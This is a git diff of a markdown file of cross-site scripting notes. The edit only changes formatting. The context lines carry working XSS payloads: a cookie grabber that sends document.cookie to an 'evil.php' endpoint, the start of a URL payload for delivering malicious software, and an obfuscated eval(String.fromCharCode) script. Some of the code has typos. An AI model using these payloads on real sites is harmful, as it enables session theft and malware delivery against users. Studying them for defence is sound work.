@@ -28,7 +28,7 @@ These are those where the injected script is reflected directly off the web serv
 DOM Based XSS is a form of XSS where the entire tainted data flow from source to sink takes place in the browser, i.e., the source of the data is in the DOM, the sink is also in the DOM, and the data flow never leaves the browser. For example, the source could be the URL of the page(e.g., document.location.href or the value of an element of the HTML), and the sink is sensitive method call that causes the execution of the malicious data(e.g., document.write).
 
 ## Use of Vulnerabilities
-*Cookie Grabber*
+**Cookie Grabber**
 ```
 <script>
 Var adr = ‘../evil.php?cakemonster=’ + escape(document.cookie);
@@ -39,7 +39,7 @@ d1.appendChild(img);
 </script>
 ```
 
-*Download of malicious software*
+**Download of malicious software**
 ```
 http://example.com/index.php?id=<script>window.onload = function() {
 var AllLinks=document.getELementByTagName("a");
@@ -110,6 +110,6 @@ Malformed IMG tags
 fromCharCode
 `<script>eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,13))</script>`
 
-To be continue
+# To be continue
 ## XSS Prevention Cheat Sheet
 
